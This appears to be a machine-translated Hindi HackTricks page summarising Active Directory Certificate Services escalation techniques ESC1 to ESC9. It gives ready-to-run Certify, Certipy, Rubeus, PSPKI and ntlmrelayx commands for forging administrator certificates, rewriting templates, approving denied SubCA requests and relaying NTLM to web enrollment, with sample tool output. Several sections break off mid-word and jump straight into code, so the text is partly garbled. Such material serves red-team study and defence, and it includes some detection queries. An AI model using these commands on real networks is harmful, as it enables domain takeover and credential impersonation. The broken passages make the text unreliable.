# एडी सीएस डोमेन एस्कलेशन

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>

**यह पोस्ट के एस्कलेशन तकनीक खंडों का सारांश है:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## गलत रूप से कॉन्फ़िगर किए गए सर्टिफिकेट टेम्पलेट्स - ESC1

### स्पष्टीकरण

### गलत रूप से कॉन्फ़िगर किए गए सर्टिफिकेट टेम्पलेट्स - ESC1 का विवरण

* **उच्च अधिकार वाले उपयोगकर्ताओं को उचित अधिकार उपलब्ध कराए गए हैं उद्यम CA द्वारा।**
* **प्रबंधक स्वीकृति की आवश्यकता नहीं है।**
* **अधिकृत कर्मचारियों के हस्ताक्षर की आवश्यकता नहीं है।**
* **सर्टिफिकेट टेम्पलेट्स पर सुरक्षा विवरण अत्यधिक अनुमति देते हैं, जिससे उच्च अधिकार वाले उपयोगकर्ता अधिकार प्राप्त कर सकते हैं।**
* **सर्टिफिकेट टेम्पलेट्स को प्रमाणीकरण को सुविधा प्रदान करने के लिए कॉन्फ़िगर किया गया है:**
* विस्तारित कुंजी उपयोग (EKU) पहचानकर्ता सत्यापन (OID 1.3.6.1.5.5.7.3.2), PKINIT क्लाइंट ऑथेंटिकेशन (1.3.6.1.5.2.3.4), स्मार्ट कार्ड लॉगऑन (OID 1.3.6.1.4.1.311.20.2.2), कोई उद्देश्य (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA) शामिल हैं।
* **अनुरोधकर्ताओं को सर्टिफिकेट साइनिंग अनुरोध (CSR) में subjectAltName शामिल करने की अनुमति दी गई है:**
* यदि मौजूद है, तो सक्रिय निर्देशिका (AD) प्रमाणीकरण के लिए सर्टिफिकेट में subjectAltName (SAN) को प्राथमिकता देती है। इसका मतलब है कि एक CSR में SAN को निर्दिष्ट करके, किसी भी उपयोगकर्ता (जैसे डोमेन प्रशासक) का प्रतिनिधित्व करने के लिए एक सर्टिफिकेट का अनुरोध किया जा सकता है। यह दर्शाता है कि क्या अनुरोधकर्ता द्वारा SAN को निर्दिष्ट किया जा सकता है, इसे सर्टिफिकेट टेम्पलेट के AD ऑब्जेक्ट के माध्यम से `mspki-certificate-name-flag` गुण से सूचित किया जाता है। यह गुण एक बिटमास्क है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` झंडा की उपस्थिति अनुरोधकर्ता द्वारा SAN की निर्दिष्टि की अनुमति देता है।

{% hint style="danger" %}
उपरोक्त कॉन्फ़िगरेशन निर्दिष्ट करता है कि उच्च अधिकार वाले उपयोगकर्ता किसी भी चयनित SAN के साथ सर्टिफिकेट का अनुरोध कर सकते हैं, जिससे केरबेरोस या एसचैनल के माध्यम से किसी भी डोमेन प्रिंसिपल के रूप में प्रमाणीकरण संभव हो जाता है।
{% endhint %}

यह सुविधा कभी-कभी HTTPS या होस्ट सर्टिफिकेट का तत्काल उत्पादन का समर्थन करने के लिए सक्षम की जाती है, उत्पादों या डिप्लॉयमेंट सेवाओं द्वारा, या समझने की कमी के कारण।

यह दर्ज किया गया है कि इस विकल्प के साथ एक सर्टिफिकेट बनाने पर चेतावनी दी जाती है, जो नहीं होता जब कोई मौजूदा सर्टिफिकेट टेम्पलेट (जैसे `WebServer` टेम्पलेट, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है) की नकल बनाई जाती है और फिर संशोधित करके प्रमाणीकरण OID शामिल किया जाता है।

### दुरुपयोग

**विकल्पनीय सर्टिफिकेट टेम्पलेट्स को खोजने** के लिए आप निम्नलिखित को चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**इस कमजोरी का दुरुपयोग करके एडमिनिस्ट्रेटर की भूमिका अभिमानित करने** के लिए निम्नलिखित को चलाया जा सकता है:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
तब आप उत्पन्न **प्रमाणपत्र को `.pfx`** प्रारूप में परिवर्तित कर सकते हैं और इसका उपयोग करके फिर से **Rubeus या certipy का उपयोग करके प्रमाणीकरण** कर सकते हैं:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows बाइनरी "Certreq.exe" और "Certutil.exe" का उपयोग PFX उत्पन्न करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD वन्य वृक्ष के विन्यास स्कीमा में प्रमाणपत्र टेम्पलेट की जाँच, विशेष रूप से उनमें स्वीकृति या हस्ताक्षर की आवश्यकता न होने वाले, क्लाइंट प्रमाणीकरण या स्मार्ट कार्ड लॉगऑन EKU वाले, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` फ्लैग सक्षम होने वाले प्रमाणपत्र टेम्पलेट की जाँच निम्नलिखित LDAP क्वेरी चलाकर की जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## गलत रूप से कॉन्फ़िगर किए गए सर्टिफिकेट टेम्पलेट्स - ESC2

### स्पष्टीकरण

दूसरे दुरुपयोग स्थिति का विवरण पहले वाले का एक रूपांतरण है:

1. उच्च-अधिकारित उपयोगकर्ताओं को उद्यम CA द्वारा पंजीकरण अधिकार प्रदान किए जाते हैं।
2. प्रबंधक स्वीकृति की आवश्यकता निषेधित की जाती है।
3. अधिकृत हस्ताक्षरों की आवश्यकता छूट दी जाती है।
4. सर्टिफिकेट टेम्पलेट पर अत्यधिक अनुमतिपूर्ण सुरक्षा विवरण उच्च-अधिकारित उपयोगकर्ताओं को सर्टिफिकेट पंजीकरण अधिकार प्रदान करता है।
5. **सर्टिफिकेट टेम्पलेट को किसी भी उद्देश्य EKU या कोई EKU शामिल किया गया है।**

**किसी भी उद्देश्य EKU** एक हमलावर द्वारा **किसी भी उद्देश्य**, जैसे क्लाइंट प्रमाणीकरण, सर्वर प्रमाणीकरण, कोड साइनिंग, आदि के लिए सर्टिफिकेट प्राप्त करने की अनुमति देता है। इसी **तकनीक का उपयोग ESC3 के लिए** इस स्थिति का शोषण करने के लिए किया जा सकता है।

**कोई EKU** वाले सर्टिफिकेट, जो उप-CA सर्टिफिकेट के रूप में कार्य करते हैं, **किसी भी उद्देश्य** के लिए शोषित किए जा सकते हैं और **नए सर्टिफिकेटों को साइन करने के लिए भी उपयोग किए जा सकते हैं**। इसलिए, एक हमलावर उप-CA सर्टिफिकेट का उपयोग करके नए सर्टिफिकेटों में विभिन्न EKUs या क्षेत्रों को निर्दिष्ट कर सकता है।

हालांकि, **डोमेन प्रमाणीकरण** के लिए नए सर्टिफिकेट उत्पन्न नहीं होंगे अगर उप-CA को **`NTAuthCertificates`** ऑब्ज
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## गलत रूप से कॉन्फ़िगर किए गए इन्रोलमेंट एजेंट टेम्प्लेट्स - ESC3

### स्पष्टीकरण

यह परिदृश्य पहले और दूसरे के समान है, लेकिन एक **विभिन्न EKU** (सर्टिफिकेट रिक्वेस्ट एजेंट) का **दुरुपयोग** करता है और **2 विभिन्न टेम्प्लेट्स** हैं (इसलिए इसमें 2 सेट की आवश्यकताएं हैं),

**सर्टिफिकेट रिक्वेस्ट एजेंट EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे माइक्रोसॉफ्ट दस्तावेज़ में **इन्रोलमेंट एजेंट** के रूप में जाना जाता है, किसी प्रधान को दूसरे उपयोगकर्ता के लिए सर्टिफिकेट के लिए **इन्रोल** करने की अनुमति देता है।

**“इन्रोलमेंट एजेंट”** ऐसे एक **टेम्प्लेट** में इन्रोल होता है और परिणामस्वरूप सर्टिफिकेट का उपयोग करके दूसरे उपयोगकर्ता के लिए एक CSR को सह-साइन करता है। फिर यह **सह-साइन किए गए CSR** को सीए को भेजता है, जो एक **टेम्प्लेट** में इन्रोल होता है जो **“किसी दूसरे के लिए इन्रोल करने की अनुमति देता है**, और सीए एक **उपयोगकर्ता के “दूसरे” के लिए सर्टिफिकेट** के साथ प्रतिसाद देता है।

**आवश्यकताएं 1:**

- उच्चाधिकारित उपयोगकर्ताओं को उच्चाधिकारित करने की अनुमति दी गई है उद्यम के सीए द्वारा।
- प्रबंधक स्वीकृति के लिए आवश्यकता छूट दी गई है।
- अधिकृत हस्ताक्षरों की कोई आवश्यकता नहीं है।
- सर्टिफिकेट टेम्प्लेट का सुरक्षा विवरण अत्यधिक अनुमति देने वाला है, जो उच्चाधिकारित उपयोगकर्ताओं को इन्रोल करने की अनुमति देता है।
- सर्टिफिकेट टेम्प्लेट में सर्टिफिकेट रिक्वेस्ट एजेंट EKU शामिल है, जो अन्य प्रधानों के लिए अन्य सर्टिफिकेट टेम्प्लेट का अनुरोध करने की अनुमति देता है।

**आवश्यकताएं 2:**

- उद्यम सीए उच्चाधिकारित उपयोगकर्ताओं को इन्रोल करने की अनुमति देता है।
- प्रबंधक स्वीकृति को छोड़ दिया गया है।
- टेम्प्लेट का स्कीमा संस्करण या 1 है या 2 से अधिक है, और यह एक एप्लिकेशन पॉलिसी इश्यूअंस आवश्यकता निर्धारित करता है जो सर्टिफिकेट रिक्वेस्ट एजेंट EKU की आवश्यकता है।
- सर्टिफिकेट टेम्प्लेट में परिभाषित एक EKU डोमेन प्रमाणीकरण की अनुमति देता है।
- सीए पर इन्रोलमेंट एजेंट्स के लिए प्रतिबंध लागू नहीं हैं।

### दुरुपयोग

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**उपयोगकर्ता** जिन्हें **एनरोलमेंट एजेंट सर्टिफिकेट** प्राप्त करने की अनुमति है, उन टेम्पलेट्स में जिनमें एनरोलमेंट **एजेंट्स** को एनरोल करने की अनुमति है, और जिनके लिए एनरोलमेंट एजेंट कार्रवाई कर सकते हैं, उन्हें एंटरप्राइज CA द्वारा प्रतिबंधित किया जा सकता है। इसे `certsrc.msc` **स्नैप-इन** खोलकर, CA पर **दायाँ क्लिक** करके, **संपत्ति** पर क्लिक करके, और फिर “एनरोलमेंट एजेंट्स” टैब पर **नेविगेट** करके प्राप्त किया जाता है।

हालांकि, यह नोट किया गया है कि CA के लिए **डिफ़ॉल्ट** सेटिंग “**एनरोलमेंट एजेंट्स को प्रतिबंधित न करें**” है। जब एनरोलमेंट एजेंट्स पर प्रतिबंध व्यवस्थापकों द्वारा सक्षम किया जाता है, तो इसे “एनरोलमेंट एजेंट्स को प्रतिबंधित करें” पर सेट करने पर भी, डिफ़ॉल्ट विन्यास अत्यंत अनुमतिपूर्ण रहता है। यह सभी को सभी टेम्पलेट्स में एनरोल करने की अनुमति देता है जैसे कोई भी।

## संवेदनशील सर्टिफिकेट टेम्पलेट एक्सेस नियंत्रण - ESC4

### **व्याख्या**

**सर्टिफिकेट टेम्पलेट्स** पर **सुरक्षा विवरण** निर्धारित करता है कि टेम्पलेट के संबंध में विशिष्ट **AD प्रिंसिपल्स** किस अनुमतियों को धारण करते हैं।

यदि किसी **हमलावर** को **अनुमतियाँ** संशोधित करने की आवश्यकता हो और **पिछले खंडों** में वर्णित किसी भी **शोषणीय गलतियों** को स्थापित करने की अनुमति हो, तो विशेषाधिकार बढ़ाया जा सकता है।

सर्टिफिकेट टेम्पलेट्स के लिए महत्वपूर्ण अनुमतियाँ निम्नलिखित हैं:

- **मालिक:** वस्तु पर नियंत्रण की निगरानी देता है, जिससे किसी भी विशेषताओं को संशोधित करने की क्षमता हो।
- **पूर्ण नियंत्रण:** वस्तु पर पूर्ण अधिकार देता है, जिसमें किसी भी विशेषताओं को संशोधित करने की क्षमता शामिल है।
- **मालिकी:** वस्तु के मालिक को बदलने की अनुमति देता है जो हमलावर के नियंत्रण में एक प्रमुख है।
- **Dacl लिखें:** पहुंच नियंत्रणों को समायोजित करने की अनुमति देता है, जो एक हमलावर को पूर्ण नियंत्रण प्रदान कर सकता है।
- **संपत्ति लिखें:** किसी भी वस्तु गुणों को संपादित करने की अनुमति देता है।

### दुरुपयोग

एक पिछले जैसे privesc का उदाहरण:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 यह है जब एक उपयोगकर्ता के पास सर्टिफिकेट टेम्पलेट पर लेखन अधिकार होते हैं। इसे उदाहरण के रूप में उपयोग किया जा सकता है ताकि सर्टिफिकेट टेम्पलेट की विन्यासिकता को ओवरराइट करने के लिए टेम्पलेट को ESC1 के लिए विकल्पयुक्त बनाया जा सके।

जैसा कि हम ऊपर के पथ में देख सकते हैं, केवल `JOHNPC` के पास ये अधिकार हैं, लेकिन हमारे उपयोगकर्ता `JOHN` के पास `JOHNPC` के लिए नई `AddKeyCredentialLink` edge है। क्योंकि यह तकनीक सर्टिफिकेटों से संबंधित है, मैंने इस हमले को भी लागू किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के रूप में जाना जाता है। यहाँ Certipy के `shadow auto` कमांड का एक छोटा सा झलक।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक एकल कमांड के साथ सर्टिफिकेट टेम्प्लेट के कॉन्फ़िगरेशन को अधिलेखित कर सकता है। **डिफ़ॉल्ट** रूप से, Certipy कॉन्फ़िगरेशन को **ESC1 के लिए वंशावधि** बनाने के लिए अधिलेखित करेगा। हम **`-save-old` पैरामीटर को निर्दिष्ट कर सकते हैं ताकि पुरानी कॉन्फ़िगरेशन को सहेजा जा सके**, जो हमारे हमले के बाद कॉन्फ़िगरेशन को **पुनर्स्थापित** करने के लिए उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## वंलरेबल पीकेआई ऑब्जेक्ट एक्सेस कंट्रोल - ESC5

### स्पष्टीकरण

जो व्यापक वेब है जिसमें संबंधित ACL आधारित संबंध है, जिसमें प्रमाण पत्र टेम्पलेट्स और प्रमाण प्राधिकरण से आगे कई ऑब्ज
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
यह ऑपरेशन मुख्य रूप से **दूरस्थ रजिस्ट्री एक्सेस** का उपयोग करता है, इसलिए, एक वैकल्पिक दृष्टिकोण हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools जैसे [**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) इस गलत विन्यास का पता लगा सकते हैं और इसका शोषण कर सकते हैं:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन सेटिंग्स को बदलने के लिए, माना जाए कि किसी के पास **डोमेन प्रशासनिक** अधिकार हैं या समकक्ष, तो निम्नलिखित कमांड को किसी भी कार्यस्थल से निष्पादित किया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
अपने पर्यावरण में इस कॉन्फ़िगरेशन को अक्षम करने के लिए, ध्वज को हटा दिया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
मई 2022 सुरक्षा अपड
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह प्रमुख अधिकारों, अर्थात् **`ManageCA`** और **`ManageCertificates`**, के बारे में अवलोकन प्रदान करता है, जो "CA प्रशासक" और "प्रमाणपत्र प्रबंधक" की भूमिकाओं के संबंध में है।

#### दुरुपयोग

प्रमाणपत्र प्राधिकरण पर **`ManageCA`** अधिकारों के अधिकार द्वारा प्रधान को PSPKI का उपयोग करके दूरस्थ सेटिंग को परिवर्तित करने की सुविधा प्राप्त होती है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ध्वज को टॉगल करना शामिल है ताकि किसी भी टेम्प्लेट में SAN विशिष्टता की अनुमति हो, जो डोमेन उन्नति का एक महत्वपूर्ण पहलू है।

इस प्रक्रिया को सरल बनाने के लिए PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग किया जा सकता है, जो सीधे GUI बातचीत के बिना संशोधन की अनुमति देता है।

**`ManageCertificates`** अधिकारों के स्वामित्व से लंबित अनुरोधों को मंजूरी देने की सुविधा प्राप्त होती है, "CA प्रमाणपत्र प्रबंधक मंजूरी" सुरक्षा उपाय को ऊपर से छलने की तकनीक को अनदेखा करते हुए।

**Certify** और **PSPKI** मॉड्यूलों का संयोजन प्रमाणपत्र का अनुरोध करने, मंजूरी देने, और डाउनलोड करने के लिए उपयोग किया जा सकता है:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### हमला 2

#### स्पष्टीकरण

{% hint style="warning" %}
**पिछले हमले** में **`Manage CA`** अनुमतियों का उपयोग किया गया था **EDITF\_ATTRIBUTESUBJECTALTNAME2** फ्लैग को सक्षम करने के लिए **ESC6 हमला** करने के लिए, लेकिन यह कोई प्रभाव नहीं डालेगा जब तक CA सेवा (`CertSvc`) को पुनः आरंभ नहीं किया जाता। जब एक उपयोगकर्ता के पास `Manage CA` एक्सेस अधिकार होते हैं, तो उपयोगकर्ता को सेवा को पुनः आरंभ करने की अनुमति भी होती है। हालांकि, यह यह नहीं मतलब है कि उपयोगकर्ता सेवा को दूरस्थ से पुनः आरंभ कर सकता है। इसके अतिरिक्त, अधिकांश पैच किए गए वातावरणों में मई 2022 सुरक्षा अपडेट के कारण **ESC6** अधिकांश काम नहीं कर सकता है।
{% endhint %}

इसलिए, यहाँ एक और हमला प्रस्तुत किया जा रहा है।

आवश्यकताएं:

* केवल **`ManageCA` अनुमति**
* **`Manage Certificates`** अनुमति (इसे **`ManageCA`** से प्रदान किया जा सकता है)
* प्रमाणपत्र टेम्पलेट **`SubCA`** को **सक्षम** होना चाहिए (इसे **`ManageCA`** से सक्षम किया जा सकता है)

यह तकनीक उस तथ्य पर निर्भर करती है कि उपयोगकर्ता जिसके पास `Manage CA` _और_ `Manage Certificates` एक्सेस अधिकार हैं, वह **विफल प्रमाणपत्र अनुरोध** जारी कर सकते हैं। **`SubCA`** प्रमाणपत्र टेम्पलेट **ESC1 के लिए विकल्पशील** है, लेकिन **केवल प्रशासक** प्रमाणपत्र टेम्पलेट में नामांकित हो सकते हैं। इसलिए, एक **उपयोगकर्ता** **`SubCA`** में नामांकित होने का **अनुरोध** कर सकता है - जिसे **इनकार किया जाएगा** - लेकिन **फिर प्रबंधक द्वारा जारी किया जाएगा**।

#### दुरुपयोग

आप अपने आप को **`Manage Certificates`** एक्सेस अधिकार प्रदान कर सकते हैं अपने उपयोगकर्ता को एक नए अधिकारी के रूप में जोड़कर।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ CA पर सक्षम किया जा सकता है। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्षम है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस हमले के लिए पूर्वापेक्षाएँ पूरी की हैं, तो हम **`SubCA` टेम्प्लेट पर आधारित प्रमाणपत्र का अनुरोध करके** शुरू कर सकते हैं।

**यह अनुरोध अस्वीकृत किया जाएगा**, लेकिन हम निजी कुंजी को सहेजेंगे और अनुरोध आईडी को नोट करेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
अपने **`Manage CA` और `Manage Certificates`** के साथ, हम फिर `ca` कमांड और `-issue-request <request ID>` पैरामीटर के साथ विफल प्रमाणपत्र अनुरोध जारी कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी प्रमाणपत्र प्राप्त कर सकते हैं**।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM रिले एडी सीएस HTTP एंडपॉइंट्स को एड करना - ESC8

### स्पष्टीकरण

{% hint style="info" %}
ऐसे वातावरण में जहां **एडी सीएस स्थापित है**, यदि एक **वेब एनरोलमेंट एंडपॉइंट वंशावली** मौजूद है और कम से कम एक **प्रमाणपत्र टेम्पलेट प्रकाशित है** जो **डोमेन कंप्यूटर एनरोलमेंट और क्लाइंट प्रमाणीकरण** की अनुमति देता है (जैसे कि डिफ़ॉल्ट **`मशीन`** टेम्पलेट), तो **किसी भी कंप्यूटर को हमलावर द्वारा क्षमता बनाना संभव हो जाता है जिसमें स्पूलर सेवा सक्रिय है**!
{% endhint %}

कई **एडी सीएस द्वारा समर्थित HTTP आधारित एनरोलमेंट विध
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` संपत्ति का उपयोग उद्यम प्रमाणपत्र प्राधिकरणों (CAs) द्वारा प्रमाणपत्र पंजीकरण सेवा (CES) अंत्यस्थियों को संग्रहित करने के लिए किया जाता है। इन अंत्यस्थियों को उपयोग करके उपकरण **Certutil.exe** का उपयोग करके सूचीबद्ध किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### प्रमाणपत्र के साथ दुरुपयोग
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

सर्टिफिकेट का अनुरोध डिफ़ॉल्ट रूप से Certipy द्वारा किया जाता है जो टेम्प्लेट `Machine` या `User` पर आधारित होता है, जो यह निर्धारित करता है कि खाता नाम का अंत `$` में समाप्त होता है। वैकल्पिक टेम्प्लेट का निर्धारण `-template` पैरामीटर का उपयोग करके किया जा सकता है।

फिर [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी एक तकनीक का उपयोग किया जा सकता है जो प्रमाणीकरण को मजबूर करने के लिए होती है। जब डोमेन कंट्रोलर्स के साथ काम किया जाता है, तो `-template DomainController` का निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## कोई सुरक्षा एक्सटेंशन - ESC9 <a href="#5485" id="5485"></a>

### व्याख्या

नए मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) के लिए **`msPKI-Enrollment-Flag`** के लिए ESC9 के रूप में संदर्भित, प्रमाणपत्र में **नई `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा एक्सटेंशन** को समाप्त करता है। यह ध्वज `StrongCertificateBindingEnforcement` को `1` पर सेट किया जाता है (डिफ़ॉल्ट सेटिंग), जो `2` पर सेटिंग के साथ विपरीत है। इसका महत्व उचित है जब `Kerberos` या `Schannel` के लिए कमजोर प्रमाणपत्र मैपिंग का शोध किया जा सकता है (जैसे ESC10 में), क्योंकि ESC9 की अनुपस्थिति आवश्यकताओं को बदल नहीं देगी।

इस ध्वज की सेटिंग महत्वपूर्ण होने की स्थितियाँ निम्नलिखित हैं:
